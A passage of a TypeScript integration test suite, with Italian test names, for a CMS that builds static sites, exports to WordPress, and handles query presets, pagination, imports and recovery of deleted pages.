    expect(details.posts).toMatchObject([{ slug: "primo-articolo-script", terms: { category: [category.term.id], post_tag: [tag.term.id] } }]);
    expect(details.templates.map((item) => item.role).sort()).toEqual(["404", "single", "tag", null].sort());
    const home = details.pages.find((item) => item.slug === "home")!;
    const homeDocument = await (await fetch(`${projectPath}/documents/${home.alias}`, { headers })).json() as { head: string };
    expect((await fetch(`${projectPath}/pages/${home.alias}`, { method: "PATCH", headers, body: JSON.stringify({ status: "published", head: homeDocument.head }) })).status).toBe(200);

    const built = await fetch(`${projectPath}/build`, { method: "POST", headers, body: "{}" });
    const buildBody = await built.json() as { status: string; previewUrl?: string | null; findings?: unknown };
    expect(built.status, JSON.stringify(buildBody)).toBe(200);
    expect(buildBody.status, JSON.stringify(buildBody.findings)).toBe("ready");
    const root = new URL("./", buildBody.previewUrl!);
    const read = async (relative: string): Promise<string> => {
      const response = await fetch(new URL(relative, root));
      expect(response.status, relative).toBe(200);
      return response.text();
    };
    const single = await read("blog/primo-articolo-script/index.html");
    expect(single).toContain(`tplsingle: Primo articolo &lt;script&gt; [/__cms-media/${project.id}/${coverId}|]`);

    // The WordPress export carries the image as an attachment and _thumbnail_id once the site has an address.
    const wxrWithout = await fetch(`${projectPath}/export-wordpress`, { headers });
    expect(wxrWithout.headers.get("X-Histos-Images-Left")).toBe("1");
    expect(await wxrWithout.text()).not.toContain("_thumbnail_id");
    const settings = await (await fetch(projectPath, { headers })).json() as { renderSettings: { locale: string; timeZone: string } };
    expect((await fetch(`${projectPath}/settings`, { method: "PATCH", headers, body: JSON.stringify({ ...settings.renderSettings, siteUrl: "https://blog.example.org" }) })).status).toBe(200);
    const wxr = await (await fetch(`${projectPath}/export-wordpress`, { headers })).text();
    const sha = createHash("sha256").update(png).digest("hex");
    expect(wxr).toContain(`<wp:post_type><![CDATA[attachment]]></wp:post_type><wp:post_password><![CDATA[]]></wp:post_password><wp:is_sticky>0</wp:is_sticky><wp:attachment_url><![CDATA[https://blog.example.org/media/${sha}.png]]></wp:attachment_url>`);
    const attachmentId = /<wp:post_id>(\d+)<\/wp:post_id>[\s\S]*?<wp:post_type><!\[CDATA\[attachment\]\]>/u.exec(wxr)?.[1];
    expect(wxr).toContain(`<wp:meta_key><![CDATA[_thumbnail_id]]></wp:meta_key><wp:meta_value><![CDATA[${attachmentId}]]></wp:meta_value>`);
    expect(single).not.toContain("<script>");
    const index = await read("blog/index.html");
    expect(index).toContain("/blog/primo-articolo-script/");
    expect(index).toContain("Un riassunto &lt;b&gt;breve&lt;/b&gt;.");
    expect(await read("category/notizie/index.html")).toContain("/blog/primo-articolo-script/");
    expect(await read("tag/sicurezza/index.html")).toContain("tpltagarc: Sicurezza");
    expect(await read("404.html")).toContain("tplmissing: Pagina non trovata");
  });

  it("un pacchetto importato da file torna con le sue basi comuni e si può reimportare nello stesso progetto", async () => {
    if (!server) throw new Error("Server di test non avviato.");
    const headers = { "X-Histos-Token": server.token, Origin: base };
    const fixture = JSON.parse(readFileSync(new URL("../../histos-contract/test/fixtures/histos-static-project-v4.json", import.meta.url), "utf8")) as { profile: StaticPageProfile; files: Record<string, string> };
    const archive = await encodeStaticPageProfileArchive(fixture.profile, new Map(Object.entries(fixture.files).map(([name, value]) => [name, Buffer.from(value, "base64")])));
    const upload = (body: Buffer) => fetch(`${base}/api/cms/v1/projects/import`, { method: "POST", headers: { ...headers, "Content-Type": "application/zip" }, body });
    const first = await upload(archive);
    expect(first.status, await first.clone().text()).toBe(201);
    const { project } = await first.json() as { project: { id: string } };
    const exported = await fetch(`${base}/api/cms/v1/projects/${project.id}/export`, { method: "POST", headers });
    expect(exported.status).toBe(200);
    const decoded = await decodeStaticPageArchive(Buffer.from(await exported.arrayBuffer()));
    const bases = Object.fromEntries(decoded.profile.entities.map((entity) => [entity.id, entity.baseHash]));
    for (const entity of fixture.profile.entities) expect(bases[entity.id], entity.id).toBe(entity.revisionHash);
    const unconfirmed = await upload(archive);
    expect(unconfirmed.status).toBe(409);
    expect(await unconfirmed.json()).toMatchObject({ code: "cms-import-update-requires-confirmation", project: { id: project.id } });
    const again = await fetch(`${base}/api/cms/v1/projects/import?update=1`, { method: "POST", headers: { ...headers, "Content-Type": "application/zip" }, body: archive });
    expect(again.status, await again.clone().text()).toBe(200);
    const result = await again.json() as { project: { id: string }; changed: string[]; backup: string };
    expect(result.backup).toMatch(/\.histosproject$/u);
    expect(result.project.id).toBe(project.id);
    const post = fixture.profile.entities.find((entity) => entity.kind === "document" && entity.payload.documentType === "post")!;
    expect(result.changed).not.toContain(post.id);
  });

  it("usa i template Histeon selezionati dal tipo nei percorsi di dettaglio e archivio statici", async () => {
    if (!server) throw new Error("Server di test non avviato.");
    const headers = { "X-Histos-Token": server.token, "Content-Type": "application/json", Origin: base };
    const created = await fetch(`${base}/api/cms/v1/projects`, { method: "POST", headers, body: JSON.stringify({ name: "Template contenuti" }) });
    const { project } = await created.json() as { project: { id: string } };
    const projectPath = `${base}/api/cms/v1/projects/${project.id}`;
    const singleResponse = await fetch(`${projectPath}/templates`, { method: "POST", headers, body: JSON.stringify({ title: "Scheda evento", ref: "content/event-single" }) });
    const archiveResponse = await fetch(`${projectPath}/templates`, { method: "POST", headers, body: JSON.stringify({ title: "Archivio eventi", ref: "content/event-archive" }) });
    expect(singleResponse.status).toBe(201);
    expect(archiveResponse.status).toBe(201);
    const single = await singleResponse.json() as { id: number; head: string; ref: string; schema: unknown };
    const archive = await archiveResponse.json() as { id: number; head: string; ref: string; schema: unknown };
    const singleContent = '<!-- wp:xb/element {"uid":"singleroot01","tag":"article"} --><!-- wp:xb/element {"uid":"singletitle1","tag":"h1"} --><!-- wp:xb/text {"uid":"singletext01","content":"{page.title}"} /--><!-- /wp:xb/element --><!-- wp:xb/element {"uid":"singlesummary","tag":"p"} --><!-- wp:xb/text {"uid":"singletext02","content":"{page.meta.summary}"} /--><!-- /wp:xb/element --><!-- wp:xb/slot {"uid":"singleslot01","name":"default"} /--><!-- /wp:xb/element -->';
    const archiveContent = '<!-- wp:xb/element {"uid":"archiveroot1","tag":"main"} --><!-- wp:xb/element {"uid":"archivetitle1","tag":"h1"} --><!-- wp:xb/text {"uid":"archivetext01","content":"{page.title}"} /--><!-- /wp:xb/element --><!-- wp:xb/loop {"uid":"archiveloop1","source":{"kind":"preset","id":"recent_news"},"as":"item"} --><!-- wp:xb/element {"uid":"archiveitem1","tag":"h2"} --><!-- wp:xb/text {"uid":"archiveitemtxt","content":"{item.title}"} /--><!-- /wp:xb/element --><!-- /wp:xb/loop --><!-- wp:xb/slot {"uid":"archiveslot1","name":"default"} /--><!-- /wp:xb/element -->';
    const savedSingle = await fetch(`${projectPath}/documents/${single.id}`, { method: "POST", headers, body: JSON.stringify({ head: single.head, ref: single.ref, schema: single.schema, content: singleContent }) });
    const savedArchive = await fetch(`${projectPath}/documents/${archive.id}`, { method: "POST", headers, body: JSON.stringify({ head: archive.head, ref: archive.ref, schema: archive.schema, content: archiveContent }) });
    expect(savedSingle.status).toBe(200);
    expect(savedArchive.status).toBe(200);

    const invalidType = await fetch(`${projectPath}/types`, { method: "POST", headers, body: JSON.stringify({ key: "invalid_news", label: "Tipo con template mancante", fields: [{ key: "summary", label: "Sommario", type: "text", public: true }], singleTemplateRef: "content/missing" }) });
    expect(invalidType.status).toBe(400);
    expect(await invalidType.json()).toMatchObject({ code: "cms-type-template-invalid" });
    const typeResponse = await fetch(`${projectPath}/types`, { method: "POST", headers, body: JSON.stringify({ key: "news", label: "Notizie", fields: [{ key: "summary", label: "Sommario", type: "text", public: true }], singleTemplateRef: single.ref, archiveTemplateRef: archive.ref }) });
    expect(typeResponse.status).toBe(201);
    expect(await typeResponse.json()).toMatchObject({ contentType: { singleTemplateRef: single.ref, archiveTemplateRef: archive.ref } });
    const recordResponse = await fetch(`${projectPath}/records`, { method: "POST", headers, body: JSON.stringify({ typeKey: "news", title: "Histeon CMS", status: "published", values: { summary: "Sommario creato dal template" } }) });
    expect(recordResponse.status).toBe(201);
    const presetResponse = await fetch(`${projectPath}/query-presets`, { method: "POST", headers, body: JSON.stringify({ key: "recent_news", label: "Notizie recenti", typeKey: "news", limit: 10, orderBy: "title", order: "asc", expectedHead: null }) });
    expect(presetResponse.status).toBe(201);

    const details = await (await fetch(projectPath, { headers })).json() as { pages: Array<{ alias: number; slug: string; status: string; headRevision: string }> };
    const home = details.pages.find((page) => page.slug === "home");
    if (!home) throw new Error("Home non presente nel progetto template.");
    const publishedHome = await fetch(`${projectPath}/pages/${home.alias}`, { method: "PATCH", headers, body: JSON.stringify({ status: "published", head: home.headRevision }) });
    expect(publishedHome.status).toBe(200);
    const built = await fetch(`${projectPath}/build`, { method: "POST", headers, body: "{}" });
    const build = await built.json() as { status: string; previewUrl?: string | null; findings?: Array<{ message: string }> };
    expect(built.status, JSON.stringify(build.findings)).toBe(200);
    expect(build.status).toBe("ready");
    const recordPage = await fetch(new URL("news/histeon-cms/index.html", new URL("./", build.previewUrl!)));
    expect(recordPage.status).toBe(200);
    expect(await recordPage.text()).toContain("Sommario creato dal template");
    const archivePage = await fetch(new URL("news/index.html", new URL("./", build.previewUrl!)));
    expect(archivePage.status).toBe(200);
    const archiveHtml = await archivePage.text();
    expect(archiveHtml).toContain("Notizie");
    expect(archiveHtml).toContain("Histeon CMS");
  });

  it("compila eventi con relazioni localizzate, immagini, tassonomie e paginazione senza pubblicare bozze o campi privati", async () => {
    if (!server) throw new Error("Server di test non avviato.");
    const headers = { "X-Histos-Token": server.token, "Content-Type": "application/json", Origin: base };
    const created = await fetch(`${base}/api/cms/v1/projects`, { method: "POST", headers, body: JSON.stringify({ name: "CMS eventi con relazioni" }) });
    const { project } = await created.json() as { project: { id: string } };
    const projectPath = `${base}/api/cms/v1/projects/${project.id}`;
    const speakerType = await fetch(`${projectPath}/types`, { method: "POST", headers, body: JSON.stringify({ key: "speaker", label: "Relatori", fields: [{ key: "bio", label: "Biografia", type: "text", public: true }, { key: "private_note", label: "Nota interna", type: "text", public: false }] }) });
    expect(speakerType.status).toBe(201);
    const speakerCreated = await fetch(`${projectPath}/records`, { method: "POST", headers, body: JSON.stringify({ typeKey: "speaker", title: "Ada Relatrice", slug: "ada-relatrice", locale: "en-US", status: "published", values: { bio: "Ricercatrice", private_note: "Solo redazione" } }) });
    expect(speakerCreated.status).toBe(201);
    const speaker = (await speakerCreated.json() as { record: { id: string } }).record;

    const eventType = await fetch(`${projectPath}/types`, { method: "POST", headers, body: JSON.stringify({ key: "events", label: "Eventi", fields: [
      { key: "event_date", label: "Data", type: "date", public: true },
      { key: "speaker", label: "Relatore", type: "relation", targetType: "speaker", public: true },
      { key: "cover", label: "Copertina", type: "asset", public: true },
      { key: "summary", label: "Descrizione", type: "rich-text", public: true },
      { key: "internal_note", label: "Nota interna", type: "text", public: false },
    ] }) });
    expect(eventType.status).toBe(201);
    const taxonomyCreated = await fetch(`${projectPath}/taxonomies`, { method: "POST", headers, body: JSON.stringify({ key: "event-category", label: "Categorie evento", types: ["events"] }) });
    expect(taxonomyCreated.status).toBe(201);
    const termCreated = await fetch(`${projectPath}/taxonomies/event-category/terms`, { method: "POST", headers, body: JSON.stringify({ slug: "formazione", label: "Formazione" }) });
    expect(termCreated.status).toBe(201);
    const term = (await termCreated.json() as { term: { id: string; alias: number } }).term;

    const png = Buffer.from("iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAQAAAC1HAwCAAAAC0lEQVR42mP8/x8AAwMCAO+/pF8AAAAASUVORK5CYII=", "base64");
    const uploaded = await fetch(`${projectPath}/media?filename=evento.png`, { method: "POST", headers: { ...headers, "Content-Type": "image/png" }, body: png });
    expect(uploaded.status).toBe(201);
    const media = await uploaded.json() as { source_url: string };
    const coverId = media.source_url.split("/").at(-1);
    expect(coverId).toMatch(/^[0-9a-f-]{36}$/u);

    for (let index = 1; index <= 21; index++) {
      const title = `Evento ${String(index).padStart(2, "0")}`;
      const response = await fetch(`${projectPath}/records`, { method: "POST", headers, body: JSON.stringify({ typeKey: "events", title, slug: `evento-${String(index).padStart(2, "0")}`, locale: "it-IT", status: "published", excerpt: "Appuntamento pubblico", values: { event_date: "2026-11-15", speaker: speaker.id, cover: coverId, summary: "Descrizione evento", internal_note: "Non pubblicare" }, terms: { "event-category": [term.alias] } }) });
      expect(response.status, await response.text()).toBe(201);
    }
    const draftCreated = await fetch(`${projectPath}/records`, { method: "POST", headers, body: JSON.stringify({ typeKey: "events", title: "Evento bozza", slug: "evento-bozza", locale: "it-IT", status: "draft", values: { event_date: "2026-12-01", speaker: speaker.id, cover: coverId, summary: "Da non pubblicare", internal_note: "Riservata" } }) });
    expect(draftCreated.status).toBe(201);

    const projectDetails = await fetch(projectPath, { headers });
    const details = await projectDetails.json() as { pages: Array<{ alias: number; slug: string; status: string; headRevision: string }>; renderSettings: { locale: string } };
    const home = details.pages.find((page) => page.slug === "home");
    if (!home) throw new Error("Home non presente nel progetto eventi.");
    const preset = await fetch(`${projectPath}/query-presets`, { method: "POST", headers, body: JSON.stringify({ key: "featured_events", label: "Eventi in evidenza", typeKey: "events", limit: 10, orderBy: "title", order: "asc", filter: { taxonomyKey: "event-category", termIds: [term.id], operator: "IN" }, expectedHead: null }) });
    expect(preset.status).toBe(201);
    const currentDocument = await fetch(`${projectPath}/documents/${home.alias}`, { headers });
    const document = await currentDocument.json() as { head: string };
    const content = '<!-- wp:xb/loop {"uid":"eventloop01","source":{"kind":"preset","id":"featured_events"},"as":"item"} --><!-- wp:xb/element {"uid":"eventhead01","tag":"h2"} --><!-- wp:xb/text {"uid":"eventtext1","content":"{item.title}"} /--><!-- /wp:xb/element --><!-- wp:xb/element {"uid":"eventbio01","tag":"p"} --><!-- wp:xb/text {"uid":"eventtext2","content":"{item.meta.speaker.title}"} /--><!-- /wp:xb/element --><!-- /wp:xb/loop -->';
    const savedDocument = await fetch(`${projectPath}/documents/${home.alias}`, { method: "POST", headers, body: JSON.stringify({ head: document.head, content }) });
    expect(savedDocument.status).toBe(200);
    const saved = await savedDocument.json() as { head: string; content: string };
    const publishHome = await fetch(`${projectPath}/pages/${home.alias}`, { method: "PATCH", headers, body: JSON.stringify({ status: "published", head: saved.head }) });
    expect(publishHome.status).toBe(200);

    const built = await fetch(`${projectPath}/build`, { method: "POST", headers, body: "{}" });
    const build = await built.json() as { status: string; previewUrl?: string; contentRoutes?: number; findings?: unknown[] };
    expect(built.status, JSON.stringify(build)).toBe(200);
    expect(build.status).toBe("ready");
    expect((build.contentRoutes ?? 0)).toBeGreaterThan(23);
    const root = new URL("./", build.previewUrl!);
    const localePath = (locale: string) => locale.toLowerCase() === details.renderSettings.locale.toLowerCase() ? "" : `${locale.toLowerCase()}/`;
    const eventPrefix = localePath("it-IT");
    const detail = await fetch(new URL(`${eventPrefix}events/evento-01/index.html`, root));
    const detailHtml = await detail.text();
    expect(detail.status, detailHtml).toBe(200);
    expect(detailHtml).toContain(`/${localePath("en-US")}speaker/ada-relatrice/`);
    expect(detailHtml).toContain("<time datetime=\"2026-11-15\">2026-11-15</time>");
    expect(detailHtml).toContain("Descrizione evento");
    expect(detailHtml).toContain("/media/");
    expect(detailHtml).not.toContain("Non pubblicare");
    // The preview puts its own prefix in front of root-relative addresses (preview-rewrite.ts).
    const imagePath = /src="((?:\/__preview\/[^"]*?)?\/media\/[0-9a-f]{64}\.png)"/u.exec(detailHtml)?.[1];
    expect(imagePath?.startsWith(root.pathname.replace(/\/$/u, ""))).toBe(true);
    const imageResponse = await fetch(new URL(imagePath!, root));
    expect(imageResponse.headers.get("content-type")).toContain("image/png");
    expect(Buffer.from(await imageResponse.arrayBuffer())).toEqual(png);

    const archive = await fetch(new URL(`${eventPrefix}events/index.html`, root));
    expect(archive.status).toBe(200);
    const archiveHtml = await archive.text();
    expect(archiveHtml).toContain(`/${eventPrefix}events/page/2/`);
    expect(archiveHtml).not.toContain("Evento bozza");
    const secondArchive = await fetch(new URL(`${eventPrefix}events/page/2/index.html`, root));
    expect(secondArchive.status).toBe(200);
    const secondArchiveHtml = await secondArchive.text();
    // 10 a page, WordPress's posts_per_page: 21 events on three pages.
    expect(secondArchiveHtml.match(/<li><article>/gu)).toHaveLength(10);
    expect(secondArchiveHtml).toMatch(/Evento \d{2}/u);
    expect(secondArchiveHtml).not.toContain("Evento bozza");
    const thirdArchive = await fetch(new URL(`${eventPrefix}events/page/3/index.html`, root));
    expect(thirdArchive.status).toBe(200);
    expect((await thirdArchive.text()).match(/<li><article>/gu)).toHaveLength(1);
    const taxonomyArchive = await fetch(new URL(`${eventPrefix}event-category/formazione/index.html`, root));
    expect(taxonomyArchive.status).toBe(200);
    expect(await taxonomyArchive.text()).toContain("Evento 21");
    const draftDetail = await fetch(new URL(`${eventPrefix}events/evento-bozza/index.html`, root));
    expect(draftDetail.status).toBe(404);
  });

  it("offre all’editor Histeon query CMS, anteprima JSON e loop eseguibili", async () => {
    if (!server) throw new Error("Server di test non avviato.");
    const headers = { "X-Histos-Token": server.token, "Content-Type": "application/json", Origin: base };
    const created = await fetch(base + "/api/cms/v1/projects", { method: "POST", headers, body: JSON.stringify({ name: "Query editor Histeon" }) });
    const { project } = await created.json() as { project: { id: string } };
    const projectPath = base + "/api/cms/v1/projects/" + project.id;
    const typeResponse = await fetch(projectPath + "/types", { method: "POST", headers, body: JSON.stringify({ key: "news", label: "Notizie", fields: [{ key: "topic", label: "Argomento", type: "text", public: true }] }) });
    expect(typeResponse.status).toBe(201);
    const recordResponse = await fetch(projectPath + "/records", { method: "POST", headers, body: JSON.stringify({ typeKey: "news", title: "Histeon CMS", status: "published", values: { topic: "SQLite" } }) });
    expect(recordResponse.status).toBe(201);
    const { record } = await recordResponse.json() as { record: { id: string; headRevision: string } };
    const taxonomyResponse = await fetch(projectPath + "/taxonomies", { method: "POST", headers, body: JSON.stringify({ key: "argomento", label: "Argomenti", types: ["news"] }) });
    expect(taxonomyResponse.status).toBe(201);
    const termResponse = await fetch(projectPath + "/taxonomies/argomento/terms", { method: "POST", headers, body: JSON.stringify({ slug: "tecnologia", label: "Tecnologia" }) });
    expect(termResponse.status).toBe(201);
    const { term } = await termResponse.json() as { term: { alias: number } };
    const updateRecord = await fetch(projectPath + "/records/" + record.id, { method: "PUT", headers, body: JSON.stringify({ typeKey: "news", head: record.headRevision, title: "Histeon CMS", status: "published", values: { topic: "SQLite" }, terms: { argomento: [term.alias] } }) });
    expect(updateRecord.status).toBe(200);
    const updatedRecord = (await updateRecord.json() as { record: { locale: string; terms: Record<string, Array<{ id: string; alias: number }>> } }).record;
    expect(updatedRecord.terms.argomento?.map((item) => item.alias)).toEqual([term.alias]);
    const directFilter = encodeURIComponent(JSON.stringify({ taxonomyKey: "argomento", termIds: [updatedRecord.terms.argomento![0]!.id], operator: "IN" }));
    const directRecords = await fetch(`${projectPath}/records?type=news&status=published&locale=${encodeURIComponent(updatedRecord.locale)}&filter=${directFilter}`, { headers });
    expect(await directRecords.json()).toMatchObject({ total: 1 });

    const initialResponse = await fetch(projectPath + "/queries", { headers });
    expect(initialResponse.status).toBe(200);
    const initial = await initialResponse.json() as { presets: Record<string, unknown>; sources: Record<string, unknown>; types: Array<{ name: string; label: string }>; head: string; base: string };
    expect(initial.types).toContainEqual({ name: "news", label: "Notizie" });
    expect(initial.base).toBe(initial.head);
    const save = await fetch(projectPath + "/queries", {
      method: "POST",
      headers,
      body: JSON.stringify({
        head: initial.head, base: initial.base,
        presets: { recent_news: { type: "posts", args: { post_type: "news", posts_per_page: "$count ?? 6", orderby: "date", order: "DESC", xb_label: "Notizie recenti", tax_query: [{ taxonomy: "argomento", field: "term_id", terms: [term.alias], operator: "IN" }] } } },
        sources: { locations: { type: "json", data: [{ name: "Rimini" }] } },
      }),
    });
    expect(save.status).toBe(200);
    const saved = await save.json() as { head: string; base: string };
    expect(saved.base).toBe(saved.head);

    const data = await (await fetch(projectPath + "/queries", { headers })).json() as { presets: Record<string, { type: string; args: Record<string, unknown> }>; sources: Record<string, { type: string; data: unknown }> };
    expect(data.presets.recent_news).toMatchObject({ type: "posts", args: { post_type: "news", posts_per_page: "$count ?? 6", order: "DESC", tax_query: [{ taxonomy: "argomento", field: "term_id", terms: [term.alias], operator: "IN" }] } });
    // Without a parameter of its own the offset goes as WordPress writes it: the loop's offset still chooses.
    expect(data.presets.recent_news?.args.offset).toBe("$offset ?? 0");
    expect(data.sources.locations).toEqual({ type: "json", data: [{ name: "Rimini" }] });
    const tested = await fetch(projectPath + "/queries/test", { method: "POST", headers, body: JSON.stringify({ id: "recent_news", preset: data.presets.recent_news, params: { count: 1 } }) });
    expect(tested.status).toBe(200);
    expect(await tested.json()).toMatchObject({ items: [{ title: "Histeon CMS", fields: expect.arrayContaining([{ path: "meta.topic", kind: "text", value: "SQLite" }]) }] });
    const options = await fetch(projectPath + "/queries/options?type=news", { headers });
    expect(await options.json()).toEqual({ taxonomies: [{ name: "argomento", label: "Argomenti", terms: [{ id: term.alias, name: "Tecnologia", slug: "tecnologia", count: 1 }] }], authors: [], roles: [] });

    const details = await (await fetch(projectPath, { headers })).json() as { pages: Array<{ alias: number; slug: string }> };
    const home = details.pages.find((page) => page.slug === "home");
    if (!home) throw new Error("Home non presente nel progetto query.");
    const content = '<!-- wp:xb/loop {"uid":"qryloop001","source":{"kind":"preset","id":"recent_news","args":{"count":"1"}},"as":"item"} --><!-- wp:xb/element {"uid":"qryhead001","tag":"h2"} --><!-- wp:xb/text {"uid":"qrytext001","content":"{item.title}"} /--><!-- /wp:xb/element --><!-- wp:xb/element {"uid":"qrymeta001","tag":"p"} --><!-- wp:xb/text {"uid":"qrytext002","content":"{item.meta.topic}"} /--><!-- /wp:xb/element --><!-- /wp:xb/loop --><!-- wp:xb/loop {"uid":"jsonloop01","source":{"kind":"expr","expr":"data.locations"},"as":"place"} --><!-- wp:xb/element {"uid":"jsonitem01","tag":"p"} --><!-- wp:xb/text {"uid":"jsontext01","content":"{place.name}"} /--><!-- /wp:xb/element --><!-- /wp:xb/loop -->';
    const rendered = await fetch(projectPath + "/render", { method: "POST", headers, body: JSON.stringify({ post_id: home.alias, content }) });
    const body = await rendered.json() as { html?: string; error?: string };
    expect(rendered.status, JSON.stringify(body)).toBe(200);
    body.html = body.html?.replace(/ data-xb-uid="[^"]*"/gu, "");
    expect(body.html).toContain("<h2>Histeon CMS</h2>");
    expect(body.html).toContain("<p>SQLite</p>");
    expect(body.html).toContain("<p>Rimini</p>");

    const conflict = await fetch(projectPath + "/queries", { method: "POST", headers, body: JSON.stringify({ head: initial.head, base: initial.base, presets: {}, sources: {} }) });
    expect(conflict.status).toBe(409);
    expect(await conflict.json()).toMatchObject({ code: "cms-content-conflict" });
  });

  it("salva e applica offset query CMS attraverso l’API", async () => {
    if (!server) throw new Error("Server di test non avviato.");
    const headers = { "X-Histos-Token": server.token, "Content-Type": "application/json", Origin: base };
    const created = await fetch(`${base}/api/cms/v1/projects`, { method: "POST", headers, body: JSON.stringify({ name: "Paginazione CMS API" }) });
    const { project } = await created.json() as { project: { id: string } };
    const projectPath = `${base}/api/cms/v1/projects/${project.id}`;
    const typeResponse = await fetch(`${projectPath}/types`, { method: "POST", headers, body: JSON.stringify({ key: "news", label: "Notizie", fields: [] }) });
    expect(typeResponse.status).toBe(201);
    for (const title of ["Articolo A", "Articolo B", "Articolo C"]) {
      const record = await fetch(`${projectPath}/records`, { method: "POST", headers, body: JSON.stringify({ typeKey: "news", title, status: "published" }) });
      expect(record.status).toBe(201);
    }
    const search = await fetch(`${projectPath}/records?type=news&status=any&limit=1&offset=0&q=${encodeURIComponent("Articolo B")}`, { headers });
    expect(search.status).toBe(200);
    expect(await search.json()).toMatchObject({ total: 1, items: [{ title: "Articolo B" }] });
    const saved = await fetch(`${projectPath}/query-presets`, { method: "POST", headers, body: JSON.stringify({ key: "page_two", label: "Seconda pagina", typeKey: "news", limit: 1, offset: 1, orderBy: "title", order: "asc", expectedHead: null }) });
    expect(saved.status).toBe(201);
    expect(await saved.json()).toMatchObject({ preset: { offset: 1 } });
    const preview = await fetch(`${projectPath}/query-presets/page_two/preview`, { method: "POST", headers, body: "{}" });
    expect(preview.status).toBe(200);
    expect(await preview.json()).toMatchObject({ items: [{ title: "Articolo B" }] });
  });

  it("mostra le pagine eliminate come recuperabili e le ripristina tramite API autenticata", async () => {
    if (!server) throw new Error("Server di test non avviato.");
    const catalog = new CmsProjectCatalog(dataDirectory);
    const { project, store } = await catalog.createProject("Recupero API");
    const exported = await createStaticPageProfile(project, store);
    const previous = exported.profile.entities.find((entity) => entity.kind === "document");
    if (!previous || previous.kind !== "document") throw new Error("Pagina fixture non trovata.");
    const payload = {
      entityKind: previous.kind,
      deletedAt: "2026-10-24T12:00:00.000Z",
      label: String(previous.payload.title),
      previousRevisionHash: previous.revisionHash,
      previousPayload: previous.payload,
    } as Record<string, JsonValue>;
    const tombstone: TransferEntity = {
      id: previous.id,
      kind: "tombstone",
      schemaVersion: 1,
      revisionHash: createHash("sha256").update(canonicalRevisionPayload("tombstone", 1, payload), "utf8").digest("hex"),
      baseHash: previous.revisionHash,
      payload,
    };
    store.applyTransferTombstone(tombstone, previous.revisionHash);
    store.close();

    const headers = { "X-Histos-Token": server.token, Origin: base };
    const details = await fetch(`${base}/api/cms/v1/projects/${project.id}`, { headers });
    expect(details.status).toBe(200);
    const before = await details.json() as { pages: Array<{ id: string }>; recoverableDeletions: Array<{ id: string; label: string; kind: string }> };
    expect(before.pages.some((page) => page.id === previous.id)).toBe(false);
    expect(before.recoverableDeletions).toContainEqual({ id: previous.id, kind: "document", label: "Home", deletedAt: "2026-10-24T12:00:00.000Z" });

    const unauthenticated = await fetch(`${base}/api/cms/v1/projects/${project.id}/recovery/tombstones/${previous.id}`, { method: "POST", headers: { Origin: base } });
    expect(unauthenticated.status).toBe(401);
    const restored = await fetch(`${base}/api/cms/v1/projects/${project.id}/recovery/tombstones/${previous.id}`, {
      method: "POST",
      headers: { ...headers, "Content-Type": "application/json" },
      body: "{}",
    });
    expect(restored.status).toBe(200);
    expect(await restored.json()).toEqual({ restored: true, id: previous.id });
    const after = await fetch(`${base}/api/cms/v1/projects/${project.id}`, { headers });
    const afterBody = await after.json() as { pages: Array<{ id: string }>; recoverableDeletions: unknown[] };
    expect(afterBody.pages.some((page) => page.id === previous.id)).toBe(true);
    expect(afterBody.recoverableDeletions).toEqual([]);
  });

  it("crea una tombstone locale solo con WordPress collegato e base comune invariata", async () => {
    if (!server) throw new Error("Server di test non avviato.");
    const catalog = new CmsProjectCatalog(dataDirectory);
    const { project, store } = await catalog.createProject("Cestino con sincronizzazione");
    store.createPage({ title: "Pagina secondaria", slug: "pagina-secondaria" });
    const exported = await createStaticPageProfile(project, store);
    const previous = exported.profile.entities.find((entity) => entity.kind === "document" && entity.payload.slug === "home");
    if (!previous || previous.kind !== "document") throw new Error("Pagina fixture non trovata.");
    const previousLabel = previous.payload.title ?? previous.payload.ref ?? previous.payload.key ?? previous.id;
    const siteId = "550e8400-e29b-41d4-a716-446655440201";
    const connectionId = "550e8400-e29b-41d4-a716-446655440202";
    store.setSyncBase(siteId, project.id, previous.id, previous.revisionHash);
    store.close();
    const remoteCatalog = new CmsRemoteCatalog(dataDirectory);
    remoteCatalog.add({
      id: connectionId, url: "https://wordpress.example.test", siteId, projectId: project.id,
      projectName: "WordPress di prova", profile: "histos-static-project-v3", read: true, write: true, publish: false,
    });
    // Closed at once: Windows cannot delete the test folder while a SQLite file is open.
    remoteCatalog.close();

    const headers = { "X-Histos-Token": server.token, Origin: base, "Content-Type": "application/json" };
    const missingTarget = await fetch(`${base}/api/cms/v1/projects/${project.id}/trash`, {
      method: "POST", headers, body: JSON.stringify({ entityIds: [previous.id] }),
    });
    expect(missingTarget.status).toBe(409);
    expect(await missingTarget.json()).toMatchObject({ code: "cms-trash-sync-target-required" });

    const queued = await fetch(`${base}/api/cms/v1/projects/${project.id}/trash`, {
      method: "POST", headers, body: JSON.stringify({ connectionId, entityIds: [previous.id] }),
    });
    expect(queued.status, await queued.clone().text()).toBe(200);
    expect(await queued.json()).toMatchObject({ recoveryAvailable: true, remoteSyncRequired: true, deleted: [{ id: previous.id, kind: "document", label: previousLabel }] });

    const reopened = await catalog.openProject(project.id);
    if (!reopened) throw new Error("Il progetto non si è riaperto.");
    try {
      expect(reopened.store.listPages().map((page) => page.id)).not.toContain(previous.id);
      const nextProfile = await createStaticPageProfile(reopened.project, reopened.store, undefined, siteId);
      const tombstone = nextProfile.profile.entities.find((entity) => entity.id === previous.id);
      expect(tombstone).toMatchObject({ kind: "tombstone", baseHash: previous.revisionHash, payload: { entityKind: "document", previousRevisionHash: previous.revisionHash } });
      expect(reopened.store.restoreTransferTombstone(previous.id)).toBe(true);
      expect(reopened.store.listPages().map((page) => page.id)).toContain(previous.id);
    } finally {
      reopened.store.close();
    }
  });

  it("cestina in locale contenuti senza base remota e li ripristina senza esportare tombstone locali", async () => {
    if (!server) throw new Error("Server di test non avviato.");
    const catalog = new CmsProjectCatalog(dataDirectory);
    const { project, store } = await catalog.createProject("Cestino solo locale");
    store.createPage({ title: "Pagina da conservare", slug: "pagina-da-conservare" });
    const exported = await createStaticPageProfile(project, store);
    const previous = exported.profile.entities.find((entity) => entity.kind === "document" && entity.payload.slug === "home");
    if (!previous || previous.kind !== "document") throw new Error("Pagina fixture non trovata.");
    const previousLabel = previous.payload.title ?? previous.payload.ref ?? previous.payload.key ?? previous.id;
    store.close();

    const headers = { "X-Histos-Token": server.token, Origin: base, "Content-Type": "application/json" };
    const queued = await fetch(`${base}/api/cms/v1/projects/${project.id}/trash`, {
      method: "POST", headers, body: JSON.stringify({ entityIds: [previous.id] }),
    });
    expect(queued.status, await queued.clone().text()).toBe(200);
